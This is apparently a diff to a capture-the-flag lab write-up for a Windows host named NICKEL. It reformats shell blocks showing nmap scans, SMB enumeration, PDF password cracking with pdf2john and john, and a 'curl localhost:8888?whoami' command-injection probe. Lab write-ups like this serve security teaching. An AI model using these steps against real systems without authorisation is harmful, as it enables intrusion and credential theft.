@@ -34,6 +34,9 @@ PORT      STATE SERVICE
 49669/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 21.09 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 21,22,135,139,445,3389,5040,8089,33333,49664-49669
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-27 01:46 UTC
@@ -90,6 +93,9 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 226.47 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10                                           
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-27 01:51 UTC
@@ -155,9 +161,14 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 41.35 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
-└─$ smbclient -N -L //$IP                                                                      
-session setup failed: NT_STATUS_ACCESS_DENIED                                                                                                                         
+└─$ smbclient -N -L //$IP                                                                      session setup failed: NT_STATUS_ACCESS_DENIED                                                
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ smbmap -H $IP        
 
@@ -172,10 +183,13 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                      <https://github.com/ShawnDEvans/smbmap>
 
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
+[*] Detected 1 hosts serving SMB                     
+[*] Established 1 SMB connections(s) and 0 authenticated session(s)                       
 [!] Something weird happened on (192.168.168.99) Error occurs while reading from remote(104) on line 1015                    
 [*] Closed 1 connections
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nxc smb $IP -u guest -p ''                                            
 SMB         192.168.168.99  445    NICKEL           [*] Windows 10 / Server 2019 Build 18362 x64 (name:NICKEL) (domain:nickel) (signing:False) (SMBv1:False)
@@ -444,7 +458,9 @@ The file was password-protected, but I successfully cracked it using `pdf2john` 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ pdf2john Infrastructure.pdf > pdf2hash
-                                                                                                                                          
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ john pdf2hash --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
@@ -521,6 +537,9 @@ While a dash prefix returned an “Incorrect Parameter” error, prepending a co
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl localhost:8888/whoami
 <!doctype html><html><body>Incorrect Parameter</body></html>
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl localhost:8888?whoami
 <!doctype html><html><body>dev-api started at 2025-12-07T05:26:25
